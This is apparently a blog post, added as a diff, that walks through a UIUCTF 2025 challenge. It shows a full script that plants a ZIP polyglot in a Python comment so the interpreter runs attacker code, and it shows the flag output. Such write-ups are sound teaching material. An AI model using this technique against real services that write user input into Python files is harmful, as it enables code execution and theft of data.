@@ -1,0 +1,589 @@
+import { ArticleLayout } from '@/components/ArticleLayout'
+import { Figure } from '@/components/Figure'
+import ctfCodeImage from './ctf_code.png'
+import challImage from './chall.png'
+import chat1Image from './chat1.png'
+import cpythonIssueImage from './cpython_issue.png'
+import chat2Image from './chat2.png'
+import debugUi1Image from './debug_ui_1.png'
+import debugUi2Image from './debug_ui_2.png'
+import eocdWikiImage from './eocd_wiki.png'
+import zipLayoutImage from './zip_layout.png'
+import structureImage from './structure.png'
+import finalImage from './final.png'
+
+export const article = {
+  author: 'Zayne Zhang',
+  date: '2025-07-28',
+  title: 'Executing arbitrary Python code from a comment',
+  description:
+    "Can you execute arbitrary Python code from only a comment? We explore how Python's overzealous ZIP file detection can lead to unexpected code execution vulnerabilities when well-escaped user input is injected into comments or string literals in Python source files.",
+}
+
+export const metadata = {
+  title: article.title,
+  description: article.description,
+}
+
+export default (props) => <ArticleLayout article={article} {...props} />
+
+Can you execute arbitrary Python code from only a comment?
+
+<Figure src={ctfCodeImage} alt="Challenge" />
+
+This was the premise of a recent CTF challenge from [UIUCTF 2025](https://ctftime.org/event/2640/)
+which I found particularly interesting. The challenge was solved by only 11 teams, and I managed to solve it with the help of [Hacktron](https://www.hacktron.ai) and a bit of random inspiration at 7AM on a Sunday morning.
+
+<Figure src={challImage} alt="Scan" />
+
+This was my first time properly playing a CTF after almost a year in hiatus. This time playing mostly independently without a cracked team like Blue Water, I managed to solve all the web challenges within the first few hours, but got stuck on this one for quite a bit longer. It did make me realise how much I missed the sport, but also how much AI has fundamentally changed the game. After a long night getting stuck on a dead end, I customised a few Hacktron agents to help me out, and lo-and-behold, I solved it 2 hours later:
+
+<Figure src={chat1Image} alt="Discord Chat" />
+
+## The Challenge
+
+The challenge itself looks deceptively simple. We connect to a service over the network, which runs the following code:
+
+```python
+#!/usr/bin/env python3
+import tempfile
+import subprocess
+import os
+
+comment = input("> ").replace("\n", "").replace("\r", "")
+
+code = f"""print("hello world!")
+# This is a comment. Here's another:
+# {comment}
+print("Thanks for playing!")"""
+
+with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
+    f.write(code)
+    temp_filename = f.name
+
+try:
+    result = subprocess.run(
+        ["python3", temp_filename], capture_output=True, text=True, timeout=5
+    )
+
+    if result.stdout:
+        print(result.stdout, end="")
+    if result.stderr:
+        print(result.stderr, end="")
+
+except subprocess.TimeoutExpired:
+    print("Timeout")
+finally:
+    os.unlink(temp_filename)
+```
+
+Essentially, a Python file is created with the following content, and we can inject arbitrary content into the comment:
+
+```python
+print("hello world!")
+# This is a comment. Here's another:
+# <user input>
+print("Thanks for playing!")
+```
+
+However, since `input()` only scans for one line, and the CR (`\r`) and LF (`\n`) characters are removed anyway, it seems we can only inject a single line of text after the `#` (i.e. we can't escape out of the comment to write executable code). How can we possibly execute arbitrary code in this context?
+
+## Idea 1: Parser Bugs
+
+_BTW this was a dead end, so if you want the actual solution, skip to the next section._
+
+I chanced upon [this issue](https://github.com/python/cpython/issues/96670) which described a parser bug that was fixed in Python 3.12.0 and 3.11.4. Essentially, lines in the source code could be terminated early by a null byte (since C-strings are null-terminated), which led to unexpected behaviour in the parser.
+
+<Figure src={cpythonIssueImage} alt="CPython Issue" />
+
+However, the challenge used a version of Python 3.11 that was not vulnerable to this specific bug. Notably, the fix was originally only introduced in Python 3.12, but was later backported into Python 3.11. The challenge specifically mentioned Python 3.11, so I thought that maybe there were other parser bugs that remained in this version of Python. I wanted to look into the main changes between the parser implementation in Python 3.12 and 3.11, but it was a **_lot_** of code to sift through.
+
+### Hacktron to the Rescue
+
+So I wrote a quick agent based on our Hacktron framework to help me out. It looked something like this (redacted, but you get the idea):
+
+```python
+class ObservedDiff(BaseModel):
+    old_file: str
+    old_line: int
+    new_file: str
+    new_line: int
+    summary: str
+    description: str
+    diff: str
+
+
+class ObservedDiffs(BaseModel):
+    observed_diffs: List[ObservedDiff]
+    overview: str
+
+
+TASK = """The old/ folder contains the old version of the codebase.
+The new/ folder contains the new version of the codebase.
+
+Find the differences between the two versions of the codebase, focusing on the following ONLY:
+- files in the Parser/ folder
+
+For each difference, provide an overview of the difference in the description and summary fields.
+
+Explain clearly what the logical difference is between the two versions of the codebase in the overview field.
+"""
+
+RULES = """
+<REDACTED>
+"""
+
+# ----- Heavily simplified pseudocode -----
+tools = [
+    ...
+    MyDiffTool(),
+    ...
+]
+
+agent = MyAgent(
+  tools=tools,
+  structured_output=ObservedDiffs,
+  task=TASK,
+  rules=RULES,
+)
+agent.run()
+```
+
+The overview output was something like this:
+
+> 1. **Introduction of New Language Features (Type Parameters and Type Aliases)**:
+>
+> - The most prominent change is the full integration of **type parameters** (e.g., `def func[T]():`, `class MyClass[T]:`) and the new type statement for **type aliases** (`type MyType = int`) into the AST and parsing logic.
+> - `Python.asdl` was updated to define the AST nodes for `TypeAlias` and `type_param` (including `TypeVar`, `ParamSpec`, `TypeVarTuple`).
+> - `parser.c` gained new PEG grammar rules to parse these new syntax elements.
+> - `action_helpers.c` was updated to handle the construction of AST nodes with the new `type_params` fields.
+> - This indicates a forward-looking enhancement to support more advanced static typing features in Python.
+>
+> 2. **Refactoring and Modernization of the Parser Core**:
+>
+> - There's a consistent effort to modernize and improve the C-API usage and internal mechanisms of the PEG parser.
+> - **Reference Counting**: Widespread adoption of `Py_NewRef` and `PyUnicode_InternImmortal` over `Py_INCREF` and `PyUnicode_InternInPlace` across `asdl_c.py` and `pegen.c`, reflecting best practices for C-API usage and better support for multi-interpreter environments.
+> - **Tokenization and Error Handling**: The Token struct in `pegen.h` now supports metadata, and the tokenization process in `pegen.c` and `pegen_errors.c` is more robust, using a structured struct token and improved lifecycle management. Error reporting has become more precise with `use_mark` and better f-string error propagation.
+> - **F-string Parsing Overhaul**: The dedicated FstringParser mechanism in `string_parser.c` and `string_parser.h` has been completely removed and replaced with a more integrated approach. This suggests that f-string parsing is now handled more directly by the core PEG parser, likely simplifying the codebase and improving performance.
+> - **Thread and Subinterpreter Safety**: Changes in `myreadline.c` explicitly address thread safety and subinterpreter isolation for global callbacks, ensuring the parser behaves correctly in complex runtime environments.
+
+    * **Performance and Debugging**: Refactoring of byte-to-character offset calculations in `pegen.c` for better UTF-8 handling, and the addition of a debug field to the Parser struct, point towards ongoing performance optimizations and improved debugging capabilities.
+
+Most of these were not really relevant at all, and the only interesting lead was the f-string parsing.
+
+```json
+{
+      "old_file": "./old/Parser/string_parser.c",
+      "new_file": "./new/Parser/string_parser.c",
+      "summary": "Complete redesign of string and f-string parsing, replacing the old FstringParser mechanism with a more integrated and generalized approach.",
+      ...
+}
+```
+
+The description was something like this:
+
+> The `string_parser.c` file has undergone a complete overhaul in its approach to parsing f-strings and possibly other string literals. The old `FstringParser` struct and its associated helper functions (e.g.,`_PyPegen_FstringParser_Init`,`_PyPegen_FstringParser_ConcatFstring`,`_PyPegen_FstringParser_Finish`) have been entirely removed. They are replaced by new, more generalized functions like `_PyPegen_parse_string` and `_PyPegen_decode_string`. This indicates that the complex, stateful f-string parsing mechanism has been replaced with a simpler, more integrated approach, likely leveraging the enhanced token and parser infrastructure (as seen in `pegen.c` and `pegen.h`).
+
+This was a bit of a long shot, given that our injection point wasn't even in an f-string. But I decided to look into it anyway, and got side-tracked for an hour or so understanding how it worked. I now know way too much about Python's parser internals, but for the purposes of this writeup, I will skip the details. All you need to know is that this was a dead end...
+
+## Idea 2: Polyglot Files
+
+When solving CTF challenges, a strategy I taught myself was timeboxing each lead to a few hours, and if I didn't make any progress, I would step back and look at the big picture again. At this point I had spent almost half a day on looking for parser bugs and was getting nowhere.
+
+I looked at the challenge again. We're running a file from the command line: `python3 <temp_filename>`. We don't control the filename, which always ends in `.py`, but we do control the contents of the file to a limited extent.
+
+```python
+result = subprocess.run(
+    ["python3", temp_filename], capture_output=True, text=True, timeout=5
+)
+```
+
+I vaguely remembered that `.pyc` files (compiled Python bytecode) can be run from the command line just like a regular `.py` file can, and would run even if renamed to have a `.py` extension.
+
+<Figure src={chat2Image} alt="Discord Chat" />
+
+This was yet another **_long_** shot, because `.pyc` files have magic headers, defined by [`PYC_MAGIC_NUMBER_TOKEN` in `pycore_magic_number.h`](https://github.com/python/cpython/blob/11503211c6e8985a305f8e2a8530e2258f982180/Include/internal/pycore_magic_number.h#L297-L301), that appear at the start of the file, and we don't control the start of the file. More details about the `.pyc` format [here](https://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html).
+
+But this got me thinking about understanding the way Python decides what kind of file it is dealing with, since it clearly doesn't infer that from the file extension.
+
+## Understanding Python's File Type Detection
+
+### Hacktron to the Rescue
+
+At this point, we've been testing a new internal debug UI for experimenting with our agents. Here's me giving it a spin with a task to find out how Python handles file types:
+
+<Figure src={debugUi1Image} alt="Debug UI" />
+
+Looking at the resulting trace, I found an interesting snippet:
+
+> The central dispatch logic resides in an if/else if/else block starting at [`Modules/main.c:603`](https://github.com/python/cpython/blob/3.11/Modules/main.c#L595-L609):
+>
+> ```python
+>    if (config->run_command) {
+>        *exitcode = pymain_run_command(config->run_command);
+>    }
+>    else if (config->run_module) {
+>        *exitcode = pymain_run_module(config->run_module, 1);
+>    }
+>    else if (main_importer_path != NULL) {
+>        *exitcode = pymain_run_module(L"__main__", 0);
+>    }
+>    else if (config->run_filename != NULL) {
+>        *exitcode = pymain_run_file(config);
+>    }
+>    else {
+>        *exitcode = pymain_run_stdin(config);
+>    }
+> ```
+>
+> - **Command Execution (`run_command`)**: If the `run_command` field of the `PyConfig` struct is set (typically via the `-c` command-line flag), the interpreter executes the provided string as a Python command by calling `pymain_run_command`.
+> - **Module Execution (`run_module`)**: If `run_command` is not set but `run_module` is (typically via the `-m` flag), the interpreter runs the specified module by calling `pymain_run_module`.
+> - **Package Execution**: An interesting case arises if `main_importer_path` is not `NULL`. This variable is set earlier in the function (at [Modules/main.c:562](https://github.com/python/cpython/tree/d542a9be51776e8d589363ee15164dec8dbd3a76/Modules/main.c#L557-L567)) if the `run_filename` points to a directory or a ZIP archive containing a `__main__.py` file. In this scenario, the interpreter executes the package as a module by calling `pymain_run_module(L"__main__", 0)`.
+> - **File Execution (`run_filename`)**: If none of the above conditions are met and `run_filename` is set, the interpreter proceeds to execute a script from a file. This is the most common execution path when a script is passed as a command-line argument.
+> - **Interactive Mode / Stdin**: If no command, module, or filename is provided, the interpreter falls back to `pymain_run_stdin`. This function is responsible for either reading and executing code from standard input or, if the input is a TTY, starting the interactive Read-Eval-Print Loop (REPL).
+
+The package execution case was particularly interesting! If the `main_importer_path` is set, then the logic is different from running a Python script directly, and this is the case when the filename "**points to a directory or a ZIP archive containing a `__main__.py` file**".
+
+Apparently, Python had allowed the interpreter to execute ZIP files [since version 2.6](https://bugs.python.org/issue1739468). This was intended for the use of ZIP archives as a way to distribute Python packages, but this also meant that if we could somehow get Python to treat our file as a ZIP archive we could potentially execute arbitrary code.
+
+As suggested by the trace, the relevant code that determines the `main_importer_path` is as follows:
+
+[`Modules/main.c:557`](https://github.com/python/cpython/blob/d542a9be51776e8d589363ee15164dec8dbd3a76/Modules/main.c#L557-L567)
+
+```c
+if (config->run_filename != NULL) {
+    /* If filename is a package (ex: directory or ZIP file) which contains
+        __main__.py, main_importer_path is set to filename and will be
+        prepended to sys.path.
+
+        Otherwise, main_importer_path is left unchanged. */
+    if (pymain_get_importer(config->run_filename, &main_importer_path,
+                            exitcode)) {
+        return;
+    }
+}
+```
+
+I put Hacktron to work again to figure out how `pymain_get_importer` determines whether the file is a ZIP archive, and how the archive is parsed. I gave it the following task:
+
+> In `Modules/main.c`, the following code determines whether a ZIP file is run.
+>
+> ```c
+> if (config->run_filename != NULL) {
+>     /* If filename is a package (ex: directory or ZIP file) which contains
+>         **main**.py, main_importer_path is set to filename and will be
+>         prepended to sys.path.
+>
+>       Otherwise, main_importer_path is left unchanged. */
+>    if (pymain_get_importer(config->run_filename, &main_importer_path,
+>                            exitcode)) {
+>        return;
+>    }
+> }
+> ```
+>
+> Trace the relevant code paths to explain in detail how a ZIP file is detected, and how it is parsed. Follow all associated paths fully, and provide a clear chronological explanation from file type detection to execution.
+
+and got it to produce some customised structured output.
+
+<Figure src={debugUi2Image} alt="Debug UI" />
+
+First, we learn that the `zipimporter` class is one of the importer hooks that `PyImport_GetImporter` attempts to use (it is also the first one).
+
+> The process begins in `Modules/main.c` with `pymain_get_importer` being called if `config->run_filename` is set. This function acts as a bridge to the Python import system, calling `PyImport_GetImporter`. `PyImport_GetImporter` retrieves `sys.path_hooks`, a list of callable importer hooks.
+>
+> Crucially, during Python's initialization, the `zipimporter` class from the `zipimport` module is imported and inserted at the beginning of `sys.path_hooks`. This ensures `zipimporter` is the first to attempt to handle the `run_filename`.
+>
+> The actual ZIP file detection occurs within the `zipimporter`'s `__init__` method. It verifies the path exists and is a regular file, then calls `_read_directory`. `_read_directory` parses the ZIP file structure by seeking the 'End of Central Directory Record' (identified by magic bytes `b'PK\x05\x06'`) and building an internal dictionary of file metadata. If the file does not conform to the ZIP format, a `ZipImportError` is raised.
+
+Crucially, it appears that `_read_directory` will start parsing the ZIP file structure as long as it finds an _End of Central Directory Record_ (EOCD), which (as the name suggests) appears towards the **_end_** of the file. This solves our problem of only being able to control the middle of the file, since we can simply add a valid EOCD towards the end of our input, and make the trailing junk part of the EOCD record. A quick look at the [Wikipedia page](<https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)>) tells us that the EOCD record can end with a comment. More on this later!
+
+<Figure src={eocdWikiImage} alt="EOCD Wiki" />
+
+Next, we learn the expected format of the ZIP file. We just need a ZIP file that contains either a `__main__.py` or `__main__.pyc` file, which is what the interpreter will look for when it tries to run the ZIP file.
+
+> Once `run_filename` is identified as a valid ZIP file, the `zipimporter` instance is returned. The interpreter then interacts with this instance to locate `__main__.py`.
+>
+> It calls `find_spec('__main__')` on the `zipimporter`, which in turn calls `_get_module_info`. `_get_module_info` constructs potential paths for the module (e.g., `__main__.py`, `__main__.pyc`) and checks if these exist within the `self._files` dictionary (populated during the detection phase).
+>
+> If `__main__.py` (or `__main__.pyc`) is found, `find_spec` returns a `ModuleSpec` object. This `ModuleSpec` indicates that the `zipimporter` is capable of loading the `__main__` module.
+
+## Constructing a Valid ZIP File
+
+### How `zipimporter` Parses ZIP Files
+
+Okay, but how does one construct a valid ZIP file that can be executed by the Python interpreter (or can we even)?
+
+To answer this, we first need to understand how `zipimporter` parses ZIP files. To do this, I modified yet another Hacktron agent to teach me.
+
+> The provided code is the source code for the Python 3.11 CPython implementation.
+>
+> Your task is to find out how the `zipimporter` parses ZIP files. You need to explain clearly how a valid ZIP file is parsed, and whether an injection into a regular Python file can be used to trick the parser into running a ZIP file.
+>
+> Explain this process in distinct sections, making reference to source code.
+
+This gave a pretty good overview, so I won't add my own commentary here:
+
+> When a `zipimporter` instance is created with a path (e.g., `zipimporter('archive.zip')`), its `__init__` method (`Lib/zipimport.py:53`) calls `_read_directory`(path) (`Lib/zipimport.py:73`). This function is responsible for parsing the ZIP file’s central directory and caching its contents.
+>
+> **Identifying a Zip File (Magic Bytes):**
+>
+> `_read_directory` first opens the potential ZIP archive using `_io.open_code(archive)` (`Lib/zipimport.py:339`).
+>
+> It then seeks to the end of the file to locate the End of Central Directory Record (EOCD). It checks for the magic number `b'PK\x05\x06'` (`STRING_END_ARCHIVE`) at the expected position (22 bytes from the end) or by searching backwards for it if a comment is present (`Lib/zipimport.py:353`, `Lib/zipimport.py:429`). This is the primary indicator that the file is a ZIP archive.
+>
+> **Parsing the Central Directory End (CDE) Record:**
+>
+> Once the EOCD is found, `_read_directory` unpacks crucial information from it, including the `header_size` (size of the central directory) and `header_offset` (offset of the central directory from the start of the archive) using `_unpack_uint32` (`Lib/zipimport.py:378-Lib/zipimport.py:379`).
+>
+> **Iterating Through Zip Entries (Central Directory):**
+>
+> The function then seeks to the calculated `header_position` (start of the Central Directory) (`Lib/zipimport.py:390`).
+>
+> It enters a loop, reading each Central Directory File Header (CDFH). Each CDFH must start with the signature `b'PK\x01\x02'` (`Lib/zipimport.py:395`).
+>
+> For each entry, it unpacks metadata such as compression method, data sizes, file offset, and file name length (`Lib/zipimport.py:399-Lib/zipimport.py:412`). This metadata, including the file name (decoded from bytes, first attempting UTF-8, then CP437/latin1) (`Lib/zipimport.py:423-Lib/zipimport.py:429`), is stored in an internal dictionary (`self._files`).
+>
+> **Locating and Loading Modules:**
+>
+> When the import system requests a module (e.g., via `find_spec` (`Lib/zipimport.py:155`)), `zipimporter` uses its `cached_files` dictionary to determine if the module exists within the archive.
+>
+> The `_get_data(archive, toc_entry)` function (`Lib/zipimport.py:461`) is responsible for retrieving the actual file content. It seeks to the `file_offset` (which points to the Local File Header, typically starting with `PK\x03\x04`), reads and skips the local header, and then reads the compressed data.
+>
+> If the data is compressed (e.g., `DEFLATE`, method 8), `zlib.decompress` is used (`Lib/zipimport.py:479`).
+>
+> Finally, `_get_module_code` takes this raw data. If it’s a `.pyc` file, it validates the bytecode magic number and timestamp, then uses `marshal.loads` to deserialize the code object. If it’s a `.py` file, it compiles the source code using Python’s built-in `compile` function (`Lib/zipimport.py:515`, `Lib/zipimport.py:521`). The resulting code object is then executed to load the module.
+
+### A Brief Overview of the ZIP File Format
+
+One thing to understand is that the reason why Python's "backwards" parsing of the ZIP file works is because ZIP files are characterised by the EOCD record at the end of the ZIP file. This EOCD record points to the start of a Central Directory (CD) which contains metadata about the files in the ZIP archive, including their names, sizes, and offsets. Each entry in the CD starts with a Central Directory File Header (CDFH), which points to the Local File Header (LFH) of each file, which are followed by the actual (compressed) file data.
+
+Note that both the EOCD and CD headers point "backwards" to an offset earlier in the file. Therefore, it doesn't actually matter what appears **_before_** the LFHs, as long as the relative offsets point to the correct locations.
+
+<Figure src={zipLayoutImage} alt="ZIP File Format" />
+
+### Our Plan
+
+What we want to do is to construct a valid ZIP file as follows (the parts we control are in red, and the parts we don't are in grey):
+
+<Figure src={structureImage} alt="File Structure" />
+
+When `zipimporter` parses the file, it will:
+
+1. Seek to 22 bytes from the end of the file to check for the magic number `b'PK\x05\x06'` (the EOCD record).
+2. It doesn't find the magic number because we have the trailing junk `\r\nprint("Thanks for playing!")` at the end of the file, so it will go back to
+   `file_size - MAX_COMMENT_LEN - END_CENTRAL_DIR_SIZE` to see if the record exists between earliest possible position and the end of the file based on the maximum possible EOCD comment length.
+
+[`Lib/zipimport.py:421-238`](https://github.com/python/cpython/blob/3.11/Lib/zipimport.py#L421-L438)
+
+```python
+if buffer[:4] != STRING_END_ARCHIVE:
+  # Bad: End of Central Dir signature
+  # Check if there's a comment.
+  try:
+      fp.seek(0, 2)
+      file_size = fp.tell()
+  except OSError:
+      raise ZipImportError(f"can't read Zip file: {archive!r}",
+                            path=archive)
+  max_comment_start = max(file_size - MAX_COMMENT_LEN -
+                          END_CENTRAL_DIR_SIZE, 0)
+  try:
+      fp.seek(max_comment_start)
+      data = fp.read()
+  except OSError:
+      raise ZipImportError(f"can't read Zip file: {archive!r}",
+                            path=archive)
+  pos = data.rfind(STRING_END_ARCHIVE)
+```
+
+3. It finds our EOCD record which appears in front of the trailing junk. Our EOCD record will point to the start to our CDFH, which we also control.
+4. The CDFH will point to the LFH, which we also control.
+5. The LFH will point to the actual file data of `__main__.py`, which we also control.
+
+### Making our Payload ASCII-Safe
+
+There is an additional complication here. Because `input()` reads a text stream instead of the raw bytes, any bytes `\x80` and above (which are invalid UTF-8 sequences) will be converted into the surrogate range `U+D800` to `U+DFFF`. This will cause the file write to fail, because the`f.write()` will attempt to encode the string into UTF-8, which will fail if it contains any surrogate pairs.
+
+To avoid this, we need to ensure that our payload is ASCII-safe, i.e. it only contains characters in the range `\x00-\x7f`.
+
+This is clearly not feasible if the file content is compressed, but thankfully the ZIP format allows us to store files without compression by setting the compression method to `0` (i.e. `ZIP_STORED`). This is specified by the compression method field in the CDFH.
+
+An additional place where this problem occurs is in the CRC-32 checksum computed over the uncompressed file data. To get around this, we can just brute-force a suffix to place at the end of our `__main__.py` file that will make the CRC-32 checksum ASCII-safe, as shown in the diagram above.
+
+```python
+def ascii_safe(x: int) -> bool:
+    """True if all four bytes have high bit clear."""
+    return all(((x >> (8 * i)) & 0x80) == 0 for i in range(4))
+
+def find_suffix(core: bytes, length: int = 4) -> bytes:
+    """Brute-force an ASCII suffix of given length making CRC 32 valid."""
+    printable = range(0x20, 0x7F)         # space … tilde
+    for tail in itertools.product(printable, repeat=length):
+        payload = core + bytes(tail)
+        crc     = zlib.crc32(payload) & 0xFFFFFFFF
+        if ascii_safe(crc):
+            return bytes(tail), crc
+    raise RuntimeError("unexpected: no suffix found")
+```
+
+The last place where this problem occurs is in the CD offset. If our payload is too long, the offset will exceed 127 bytes, which introduces a non-ASCII byte.
+To get around this, we just add padding after the file contents and before the CDFH, so that the offset contains only ASCII-safe bytes, e.g. `\x01\x00`.
+
+```python
+# patch CD offset to make it ASCII safe
+cd_offset = delta + len(lfh) + len(PAYLOAD)
+
+pad = 0
+while not ascii_safe(cd_offset + pad):
+    pad += 1
+padding = b'\x00' * pad
+
+cd_offset += pad
+```
+
+## Putting it All Together
+
+Our final payload looks like this:
+
+<Figure src={finalImage} alt="Payload" />
+
+which we construct and send to the service with the following code:
+
+```python
+import io, struct, zipfile, pathlib
+import itertools
+import zlib
+from pwn import remote
+
+JUNK_HEAD = """print("hello world!")
+# This is a comment. Here's another:
+# """.encode()
+JUNK_TAIL = """
+print("Thanks for playing!")"""
+
+FILENAME = b"__main__.py"
+BODY     = b"print(open('/home/ctfuser/flag').read())#"
+
+def ascii_safe(x: int) -> bool:
+    """True if all four bytes have high bit clear."""
+    return all(((x >> (8 * i)) & 0x80) == 0 for i in range(4))
+
+def find_suffix(core: bytes, length: int = 4) -> bytes:
+    """Brute-force an ASCII suffix of given length making CRC 32 valid."""
+    printable = range(0x20, 0x7F)         # space … tilde
+    for tail in itertools.product(printable, repeat=length):
+        payload = core + bytes(tail)
+        crc     = zlib.crc32(payload) & 0xFFFFFFFF
+        if ascii_safe(crc):
+            return bytes(tail), crc
+    raise RuntimeError("unexpected: no suffix found")
+
+SUFFIX, CRC = find_suffix(BODY)
+PAYLOAD     = BODY + SUFFIX
+SIZE        = len(PAYLOAD)
+
+def le32(x): return struct.pack("<I", x)
+def le16(x): return struct.pack("<H", x)
+
+SIG_LFH  = 0x04034B50
+SIG_CDH  = 0x02014B50
+SIG_EOCD = 0x06054B50
+
+# --------------------------------------------------------------------
+# build the ZIP file
+# --------------------------------------------------------------------
+
+delta = len(JUNK_HEAD)
+
+# Local file header
+lfh  = le32(SIG_LFH)
+lfh += le16(0)          # version needed to extract
+lfh += le16(0)          # general purpose bit flag
+lfh += le16(0)          # compression method = stored
+lfh += le16(0)          # last mod file time
+lfh += le16(0)          # last mod file date
+lfh += le32(CRC)
+lfh += le32(SIZE)       # compressed size
+lfh += le32(SIZE)       # uncompressed size
+lfh += le16(len(FILENAME))
+lfh += le16(0)          # extra field length
+lfh += FILENAME
+
+# Central directory header
+cdh  = le32(SIG_CDH)
+cdh += le16(0)          # version made by
+cdh += le16(0)          # version needed
+cdh += le16(0)          # flags
+cdh += le16(0)          # method
+cdh += le16(0)          # time
+cdh += le16(0)          # date
+cdh += le32(CRC)
+cdh += le32(SIZE)
+cdh += le32(SIZE)
+cdh += le16(len(FILENAME))
+cdh += le16(0)          # extra len
+cdh += le16(0)          # comment len
+cdh += le16(0)          # disk #
+cdh += le16(0)          # int attrs
+cdh += le32(0)          # ext attrs
+cdh += le32(delta)      # relative offset of LFH
+cdh += FILENAME
+
+# patch CD offset to make it ASCII safe
+cd_offset = delta + len(lfh) + len(PAYLOAD)
+
+pad = 0
+while not ascii_safe(cd_offset + pad):
+    pad += 1
+padding = b'\x00' * pad
+
+cd_offset += pad
+
+# end of central directory record
+eocd  = le32(SIG_EOCD)
+eocd += le16(0)         # disk #
+eocd += le16(0)         # disk where CD starts
+eocd += le16(1)         # # entries on this disk
+eocd += le16(1)         # total # entries
+eocd += le32(len(cdh))  # size of central directory
+eocd += le32(cd_offset) # offset of CD
+eocd += le16(len(JUNK_TAIL)) # ZIP comment length
+
+zip_bytes = lfh + PAYLOAD + padding + cdh + eocd
+zip_bytes = bytearray(zip_bytes)
+assert all(b < 0x80 for b in zip_bytes), "non-ASCII byte detected!"
+
+# --------------------------------------------------------------------
+# solve the challenge
+# --------------------------------------------------------------------
+
+with open("polyglot.zip", "wb") as f:
+    f.write(JUNK_HEAD + zip_bytes + JUNK_TAIL.encode())
+
+conn = remote("comments-only.chal.uiuc.tf", 1337, ssl=True)
+conn.sendlineafter(">", zip_bytes)
+print(conn.recvall().decode('latin-1'))
+```
+
+This gives us the flag:
+
+```bash
+$ python3 solve.py
+[+] Opening connection to comments-only.chal.uiuc.tf on port 1337: Done
+[+] Receiving all data: Done (38B)
+[*] Closed connection to comments-only.chal.uiuc.tf port 1337
+ uiuctf{yeehaw_954b4b3814b22c0b4eecd}
+```
+
+## Conclusion
+
+I think I wouldn't have solved this challenge (or at least not as quickly) without the help of Hacktron. In general, AI has helped me a lot in this CTF.
+This challenge was the best example of this, but I also used AI to help me in:
+
+- Writing exploits for the final web challenge, which involved an interesting side channel involving the TypeScript compiler.
+- All of the cryptography challenges. Interestingly, o3 was able to one-shot them.
+
+Hacktron's flexibility was also a game changer, allowing me to quickly adapt it to my needs and get it to do exactly what I wanted. I think this is a good example of how AI can be used to augment human capabilities, and I'm excited to see how it will continue to evolve in the future.
+
+In particular, I think that human pentesters and security researchers will soon be able to customise agents in very specific ways to improve their productivity in the immediate future, and Hacktron will be part of that. With highly performant and versatile agents that can be plugged into a wide range of existing workflows and components of the software development lifecycle, I think we will see a new era of AI-assisted security engineering.
